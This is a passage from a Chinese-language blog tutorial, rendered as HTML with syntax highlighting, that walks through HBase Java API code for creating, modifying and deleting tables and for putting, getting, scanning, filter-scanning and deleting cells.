class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 创建表格</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> namespace 命名空间名称</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> tableName 表格名称</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> columnFamilies 列族名称 可以有多个</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">createTable</span><span class="params">(String namespace , String</span></span></span><br><span class="line"><span class="function"><span class="params">        tableName , String... columnFamilies)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">    <span class="comment">// 判断是否有至少一个列族</span></span><br><span class="line">    <span class="keyword">if</span> (columnFamilies.length == <span class="number">0</span>)&#123;</span><br><span class="line">        System.out.println(<span class="string">"创建表格至少有一个列族"</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 判断表格是否存在</span></span><br><span class="line">    <span class="keyword">if</span> (isTableExists(namespace,tableName))&#123;</span><br><span class="line">        System.out.println(<span class="string">"表格已经存在"</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 1.获取 admin</span></span><br><span class="line">    Admin admin = connection.getAdmin();</span><br><span class="line">    <span class="comment">// 2. 调用方法创建表格</span></span><br><span class="line">    <span class="comment">// 2.1 创建表格描述的建造者</span></span><br><span class="line">    TableDescriptorBuilder tableDescriptorBuilder =</span><br><span class="line">            TableDescriptorBuilder.newBuilder(TableName.valueOf(namespace, tableName));</span><br><span class="line">    <span class="comment">// 2.2 添加参数</span></span><br><span class="line">    <span class="keyword">for</span> (String columnFamily : columnFamilies) &#123;</span><br><span class="line">        <span class="comment">// 2.3 创建列族描述的建造者</span></span><br><span class="line">        ColumnFamilyDescriptorBuilder</span><br><span class="line">                columnFamilyDescriptorBuilder = ColumnFamilyDescriptorBuilder.newBuilder(Bytes.toBytes(columnFamily));</span><br><span class="line">        <span class="comment">// 2.4 对应当前的列族添加参数</span></span><br><span class="line">        <span class="comment">// 添加版本参数</span></span><br><span class="line">        columnFamilyDescriptorBuilder.setMaxVersions(<span class="number">5</span>);</span><br><span class="line">        <span class="comment">// 2.5 创建添加完参数的列族描述</span></span><br><span class="line">        tableDescriptorBuilder.setColumnFamily(columnFamilyDescriptorBuilder.build());</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 2.6 创建对应的表格描述</span></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        admin.createTable(tableDescriptorBuilder.build());</span><br><span class="line">    &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 3. 关闭 admin</span></span><br><span class="line">    admin.close();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="2-4-修改表">2.4 修改表</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 修改表格中一个列族的版本</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> namespace    命名空间名称</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> tableName    表格名称</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> columnFamily 列族名称</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> version      版本</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">modifyTable</span><span class="params">(String namespace, String</span></span></span><br><span class="line"><span class="function"><span class="params">        tableName, String columnFamily, <span class="keyword">int</span> version)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">    <span class="comment">// 判断表格是否存在</span></span><br><span class="line">    <span class="keyword">if</span> (!isTableExists(namespace, tableName)) &#123;</span><br><span class="line">        System.out.println(<span class="string">"表格不存在无法修改"</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 1. 获取 admin</span></span><br><span class="line">    Admin admin = connection.getAdmin();</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// 2. 调用方法修改表格</span></span><br><span class="line">        <span class="comment">// 2.0 获取之前的表格描述</span></span><br><span class="line">        TableDescriptor descriptor =</span><br><span class="line">                admin.getDescriptor(TableName.valueOf(namespace, tableName));</span><br><span class="line">        <span class="comment">// 2.1 创建一个表格描述建造者</span></span><br><span class="line">        <span class="comment">// 如果使用填写 tableName 的方法 相当于创建了一个新的表格描述建造者没有之前的信息</span></span><br><span class="line">        <span class="comment">// 如果想要修改之前的信息 必须调用方法填写一个旧的表格描述</span></span><br><span class="line">        TableDescriptorBuilder tableDescriptorBuilder =</span><br><span class="line">                TableDescriptorBuilder.newBuilder(descriptor);</span><br><span class="line">        <span class="comment">// 2.2 对应建造者进行表格数据的修改</span></span><br><span class="line">        ColumnFamilyDescriptor columnFamily1 =</span><br><span class="line">                descriptor.getColumnFamily(Bytes.toBytes(columnFamily));</span><br><span class="line">        <span class="comment">// 创建列族描述建造者</span></span><br><span class="line">        <span class="comment">// 需要填写旧的列族描述</span></span><br><span class="line">        ColumnFamilyDescriptorBuilder</span><br><span class="line">                columnFamilyDescriptorBuilder = ColumnFamilyDescriptorBuilder.newBuilder(columnFamily1);</span><br><span class="line">        <span class="comment">// 修改对应的版本</span></span><br><span class="line">        columnFamilyDescriptorBuilder.setMaxVersions(version);</span><br><span class="line">        <span class="comment">// 此处修改的时候 如果填写的新创建 那么别的参数会初始化</span></span><br><span class="line"></span><br><span class="line">        tableDescriptorBuilder.modifyColumnFamily(columnFamilyDescriptorBuilder.build());</span><br><span class="line">        admin.modifyTable(tableDescriptorBuilder.build());</span><br><span class="line">    &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 3. 关闭 admin</span></span><br><span class="line">    admin.close();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="2-5-删除表">2.5 删除表</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 删除表格</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> namespace 命名空间名称</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> tableName 表格名称</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> true 表示删除成功</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">boolean</span> <span class="title">deleteTable</span><span class="params">(String namespace ,String tableName)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">    <span class="comment">// 1. 判断表格是否存在</span></span><br><span class="line">    <span class="keyword">if</span> (!isTableExists(namespace,tableName))&#123;</span><br><span class="line">        System.out.println(<span class="string">"表格不存在 无法删除"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 2. 获取 admin</span></span><br><span class="line">    Admin admin = connection.getAdmin();</span><br><span class="line">    <span class="comment">// 3. 调用相关的方法删除表格</span></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// HBase 删除表格之前 一定要先标记表格为不可以</span></span><br><span class="line">        TableName tableName1 = TableName.valueOf(namespace, tableName);</span><br><span class="line">        admin.disableTable(tableName1);</span><br><span class="line">        admin.deleteTable(tableName1);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 4. 关闭 admin</span></span><br><span class="line">    admin.close();</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="3、DML">3、DML</h2><p>创建类 HBaseDML</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HBaseDML</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 添加静态属性 connection 指向单例连接</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Connection connection = HBaseConnect.connection;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="3-1-插入数据">3.1 插入数据</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 插入数据</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> namespace 命名空间名称</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> tableName 表格名称</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> rowKey 主键</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> columnFamily 列族名称</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> columnName 列名</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> value 值</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">putCell</span><span class="params">(String namespace,String</span></span></span><br><span class="line"><span class="function"><span class="params">        tableName,String rowKey, String columnFamily,String</span></span></span><br><span class="line"><span class="function"><span class="params">                                   columnName,String value)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">    <span class="comment">// 1. 获取 table</span></span><br><span class="line">    Table table = connection.getTable(TableName.valueOf(namespace, tableName));</span><br><span class="line">    <span class="comment">// 2. 调用相关方法插入数据</span></span><br><span class="line">    <span class="comment">// 2.1 创建 put 对象</span></span><br><span class="line">    Put put = <span class="keyword">new</span> Put(Bytes.toBytes(rowKey));</span><br><span class="line">    <span class="comment">// 2.2. 给 put 对象添加数据</span></span><br><span class="line">    put.addColumn(Bytes.toBytes(columnFamily),Bytes.toBytes(columnName), Bytes.toBytes(value));</span><br><span class="line">    <span class="comment">// 2.3 将对象写入对应的方法</span></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        table.put(put);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 3. 关闭 table</span></span><br><span class="line">    table.close();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="3-2-读取数据">3.2 读取数据</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 读取数据 读取对应的一行中的某一列</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> namespace 命名空间名称</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> tableName 表格名称</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> rowKey 主键</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> columnFamily 列族名称</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> columnName 列名</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">getCells</span><span class="params">(String namespace, String tableName,</span></span></span><br><span class="line"><span class="function"><span class="params">                            String rowKey, String columnFamily, String columnName)</span> <span class="keyword">throws</span></span></span><br><span class="line"><span class="function">        IOException </span>&#123;</span><br><span class="line">    <span class="comment">// 1. 获取 table</span></span><br><span class="line">    Table table =connection.getTable(TableName.valueOf(namespace, tableName));</span><br><span class="line">    <span class="comment">// 2. 创建 get 对象</span></span><br><span class="line">    Get get = <span class="keyword">new</span> Get(Bytes.toBytes(rowKey));</span><br><span class="line">    <span class="comment">// 如果直接调用 get 方法读取数据 此时读一整行数据</span></span><br><span class="line">    <span class="comment">// 如果想读取某一列的数据 需要添加对应的参数</span></span><br><span class="line">    get.addColumn(Bytes.toBytes(columnFamily),Bytes.toBytes(columnName));</span><br><span class="line">    <span class="comment">// 设置读取数据的版本</span></span><br><span class="line">    get.readAllVersions();</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// 读取数据 得到 result 对象</span></span><br><span class="line">        Result result = table.get(get);</span><br><span class="line">        <span class="comment">// 处理数据</span></span><br><span class="line">        Cell[] cells = result.rawCells();</span><br><span class="line">        <span class="comment">// 测试方法: 直接把读取的数据打印到控制台</span></span><br><span class="line">        <span class="comment">// 如果是实际开发 需要再额外写方法 对应处理数据</span></span><br><span class="line">        <span class="keyword">for</span> (Cell cell : cells) &#123;</span><br><span class="line">            <span class="comment">// cell 存储数据比较底层</span></span><br><span class="line">            String value = <span class="keyword">new</span> String(CellUtil.cloneValue(cell));</span><br><span class="line">            System.out.println(value);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 关闭 table</span></span><br><span class="line">    table.close();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="3-3-扫描数据">3.3 扫描数据</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 扫描数据</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> namespace 命名空间</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> tableName 表格名称</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> startRow 开始的 row 包含的</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> stopRow 结束的 row 不包含</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">scanRows</span><span class="params">(String namespace, String tableName,</span></span></span><br><span class="line"><span class="function"><span class="params">                            String startRow, String stopRow)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">    <span class="comment">// 1. 获取 table</span></span><br><span class="line">    Table table = connection.getTable(TableName.valueOf(namespace, tableName));</span><br><span class="line">    <span class="comment">// 2. 创建 scan 对象</span></span><br><span class="line">    Scan scan = <span class="keyword">new</span> Scan();</span><br><span class="line">    <span class="comment">// 如果此时直接调用 会直接扫描整张表</span></span><br><span class="line">    <span class="comment">// 添加参数 来控制扫描的数据</span></span><br><span class="line">    <span class="comment">// 默认包含</span></span><br><span class="line">    scan.withStartRow(Bytes.toBytes(startRow));</span><br><span class="line">    <span class="comment">// 默认不包含</span></span><br><span class="line">    scan.withStopRow(Bytes.toBytes(stopRow));</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// 读取多行数据 获得 scanner</span></span><br><span class="line">        ResultScanner scanner = table.getScanner(scan);</span><br><span class="line">        <span class="comment">// result 来记录一行数据 cell 数组</span></span><br><span class="line">        <span class="comment">// ResultScanner 来记录多行数据 result 的数组</span></span><br><span class="line">        <span class="keyword">for</span> (Result result : scanner) &#123;</span><br><span class="line">            Cell[] cells = result.rawCells();</span><br><span class="line">            <span class="keyword">for</span> (Cell cell : cells) &#123;</span><br><span class="line">                System.out.print (<span class="keyword">new</span> String(CellUtil.cloneRow(cell)) + <span class="string">"-"</span> + <span class="keyword">new</span></span><br><span class="line">                        String(CellUtil.cloneFamily(cell)) + <span class="string">"-"</span> + <span class="keyword">new</span></span><br><span class="line">                        String(CellUtil.cloneQualifier(cell)) + <span class="string">"-"</span> + <span class="keyword">new</span></span><br><span class="line">                        String(CellUtil.cloneValue(cell)) + <span class="string">"\t"</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            System.out.println();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 3. 关闭 table</span></span><br><span class="line">    table.close();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="3-4-带过滤扫描">3.4 带过滤扫描</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 带过滤的扫描</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> namespace 命名空间</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> tableName 表格名称</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> startRow 开始 row</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> stopRow 结束 row</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> columnFamily 列族名称</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> columnName 列名</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> value value 值</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> IOException</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">filterScan</span><span class="params">(String namespace, String tableName,</span></span></span><br><span class="line"><span class="function"><span class="params">                              String startRow, String stopRow, String columnFamily, String</span></span></span><br><span class="line"><span class="function"><span class="params">                                      columnName, String value)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">    <span class="comment">// 1. 获取 table</span></span><br><span class="line">    Table table = connection.getTable(TableName.valueOf(namespace, tableName));</span><br><span class="line">    <span class="comment">// 2. 创建 scan 对象</span></span><br><span class="line">    Scan scan = <span class="keyword">new</span> Scan();</span><br><span class="line">    <span class="comment">// 如果此时直接调用 会直接扫描整张表</span></span><br><span class="line">    <span class="comment">// 添加参数 来控制扫描的数据</span></span><br><span class="line">    <span class="comment">// 默认包含</span></span><br><span class="line">    scan.withStartRow(Bytes.toBytes(startRow));</span><br><span class="line">    <span class="comment">// 默认不包含</span></span><br><span class="line">    scan.withStopRow(Bytes.toBytes(stopRow));</span><br><span class="line">    <span class="comment">// 可以添加多个过滤</span></span><br><span class="line">    FilterList filterList = <span class="keyword">new</span> FilterList();</span><br><span class="line">    <span class="comment">// 创建过滤器</span></span><br><span class="line">    <span class="comment">// (1) 结果只保留当前列的数据</span></span><br><span class="line">    ColumnValueFilter columnValueFilter = <span class="keyword">new</span> ColumnValueFilter(</span><br><span class="line">            <span class="comment">// 列族名称</span></span><br><span class="line">            Bytes.toBytes(columnFamily),</span><br><span class="line">            <span class="comment">// 列名</span></span><br><span class="line">            Bytes.toBytes(columnName),</span><br><span class="line">            <span class="comment">// 比较关系</span></span><br><span class="line">            CompareOperator.EQUAL,</span><br><span class="line">            <span class="comment">// 值</span></span><br><span class="line">            Bytes.toBytes(value)</span><br><span class="line">    );</span><br><span class="line">    <span class="comment">// (2) 结果保留整行数据</span></span><br><span class="line">    <span class="comment">// 结果同时会保留没有当前列的数据</span></span><br><span class="line">    SingleColumnValueFilter singleColumnValueFilter = <span class="keyword">new</span></span><br><span class="line">            SingleColumnValueFilter(</span><br><span class="line">            <span class="comment">// 列族名称</span></span><br><span class="line">            Bytes.toBytes(columnFamily),</span><br><span class="line">            <span class="comment">// 列名</span></span><br><span class="line">            Bytes.toBytes(columnName),</span><br><span class="line">            <span class="comment">// 比较关系</span></span><br><span class="line">            CompareOperator.EQUAL,</span><br><span class="line">            <span class="comment">// 值</span></span><br><span class="line">            Bytes.toBytes(value)</span><br><span class="line">    );</span><br><span class="line">    <span class="comment">// 本身可以添加多个过滤器</span></span><br><span class="line">    filterList.addFilter(singleColumnValueFilter);</span><br><span class="line">    <span class="comment">// 添加过滤</span></span><br><span class="line">    scan.setFilter(filterList);</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// 读取多行数据 获得 scanner</span></span><br><span class="line">        ResultScanner scanner = table.getScanner(scan);</span><br><span class="line">        <span class="comment">// result 来记录一行数据 cell 数组</span></span><br><span class="line">        <span class="comment">// ResultScanner 来记录多行数据 result 的数组</span></span><br><span class="line">        <span class="keyword">for</span> (Result result : scanner) &#123;</span><br><span class="line">            Cell[] cells = result.rawCells();</span><br><span class="line">            <span class="keyword">for</span> (Cell cell : cells) &#123;</span><br><span class="line">                System.out.print(<span class="keyword">new</span></span><br><span class="line">                        String(CellUtil.cloneRow(cell)) + <span class="string">"-"</span> + <span class="keyword">new</span></span><br><span class="line">                        String(CellUtil.cloneFamily(cell)) + <span class="string">"-"</span> + <span class="keyword">new</span></span><br><span class="line">                        String(CellUtil.cloneQualifier(cell)) + <span class="string">"-"</span> + <span class="keyword">new</span></span><br><span class="line">                        String(CellUtil.cloneValue(cell)) + <span class="string">"\t"</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            System.out.println();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 3. 关闭 table</span></span><br><span class="line">    table.close();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="3-5-删除数据">3.5 删除数据</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 删除 column 数据</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> nameSpace</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> tableName</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> rowKey</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> family</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> column</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> IOException</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">deleteColumn</span><span class="params">(String nameSpace, String tableName,</span></span></span><br><span class="line"><span class="function"><span class="params">                                String rowKey, String family, String column)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">    <span class="comment">// 1.获取 table</span></span><br><span class="line">    Table table = connection.getTable(TableName.valueOf(nameSpace, tableName));</span><br><span class="line">    <span 